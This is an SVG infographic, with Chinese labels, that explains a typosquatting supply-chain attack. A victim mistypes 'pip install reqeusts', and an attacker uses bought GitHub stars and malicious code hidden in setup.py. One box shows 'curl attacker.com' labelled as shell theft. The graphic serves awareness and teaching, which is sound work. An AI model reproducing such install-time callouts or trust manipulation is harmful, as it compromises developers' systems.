<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 480"><defs><linearGradient id="bg" x1="0%" x2="100%" y1="0%" y2="100%"><stop offset="0%" style="stop-color:#faf9f5"/><stop offset="100%" style="stop-color:#e3dacc"/></linearGradient><filter id="shadow" width="140%" height="140%" x="-20%" y="-20%"><feDropShadow dx="2" dy="3" flood-color="#141413" flood-opacity=".15" stdDeviation="3"/></filter></defs><path fill="url(#bg)" d="M0 0h800v480H0z"/><text x="400" y="38" fill="#141413" font-family="system-ui,-apple-system,sans-serif" font-size="20" font-weight="700" text-anchor="middle">攻击者的 Playbook：Typosquatting 流程</text><rect width="180" height="320" x="40" y="70" fill="#faf9f5" stroke="#d1cfc5" stroke-width="2" filter="url(#shadow)" rx="12"/><text x="130" y="100" fill="#141413" font-family="system-ui,sans-serif" font-size="14" font-weight="600" text-anchor="middle">受害者</text><rect width="150" height="70" x="55" y="115" fill="#141413" rx="6"/><text x="65" y="140" fill="#e3dacc" font-family="monospace" font-size="11">$ pip install</text><text x="65" y="158" fill="#d97757" font-family="monospace" font-size="11">  reqeusts</text><text x="65" y="176" fill="#87867f" font-family="monospace" font-size="9">  ↑ 拼写错误</text><circle cx="130" cy="245" r="28" fill="#e3dacc"/><text x="130" y="240" fill="#141413" font-family="system-ui,sans-serif" font-size="10" text-anchor="middle">确认偏误</text><text x="130" y="254" fill="#141413" font-family="system-ui,sans-serif" font-size="10" text-anchor="middle">&quot;对的，就是这个&quot;</text><rect width="80" height="22" x="90" y="285" fill="#788c5d" rx="11"/><text x="130" y="300" fill="#faf9f5" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">GitHub = 安全</text><text x="130" y="365" fill="#d97757" font-family="system-ui,sans-serif" font-size="12" font-weight="600" text-anchor="middle">💀 服务器被接管</text><rect width="180" height="320" x="580" y="70" fill="#faf9f5" stroke="#d97757" stroke-width="2" filter="url(#shadow)" rx="12"/><text x="670" y="100" fill="#d97757" font-family="system-ui,sans-serif" font-size="14" font-weight="600" text-anchor="middle">攻击者</text><rect width="150" height="80" x="595" y="120" fill="#faf9f5" stroke="#d97757" stroke-width="1.5" rx="6"/><text x="670" y="145" fill="#141413" font-family="system-ui,sans-serif" font-size="12" text-anchor="middle">⭐ 1,247 stars</text><text x="670" y="163" fill="#87867f" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">reqeusts</text><text x="670" y="180" fill="#d97757" font-family="monospace" font-size="9" text-anchor="middle">上周创建 · $50 购买</text><rect width="120" height="40" x="605" y="215" fill="#d97757" rx="6"/><text x="665" y="240" fill="#faf9f5" font-family="system-ui,sans-serif" font-size="12" text-anchor="middle">setup.py</text><text x="665" y="253" fill="#faf9f5" font-family="monospace" font-size="9" text-anchor="middle">恶意代码隐藏其中</text><rect width="120" height="40" x="605" y="270" fill="#141413" rx="6"/><text x="665" y="290" fill="#faf9f5" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">curl attacker.com</text><text x="665" y="303" fill="#d97757" font-family="monospace" font-size="9" text-anchor="middle">shell 窃取</text><rect width="150" height="40" x="595" y="325" fill="#e3dacc" rx="6"/><text x="670" y="345" fill="#141413" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">$50 = 500 stars</text><text x="670" y="358" fill="#87867f" font-family="system-ui,sans-serif" font-size="9" text-anchor="middle">信任商品化</text><path fill="none" stroke="#d97757" stroke-dasharray="8,4" stroke-width="2.5" d="M230 200c90-40 250-40 340 0"/><path fill="#d97757" d="m570 195 10 5-10 5z"/><text x="400" y="155" fill="#d97757" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">安装恶意包</text><rect width="260" height="50" x="270" y="410" fill="#faf9f5" stroke="#141413" stroke-width="1.5" rx="8"/><text x="400" y="432" fill="#141413" font-family="system-ui,sans-serif" font-size="11" text-anchor="middle">攻击手段：拼写劫持 | 虚假 Star | 依赖混淆</text><text x="400" y="450" fill="#87867f" font-family="system-ui,sans-serif" font-size="10" text-anchor="middle">伪装流行项目 · 植入恶意代码 · 购买信任信号</text></svg>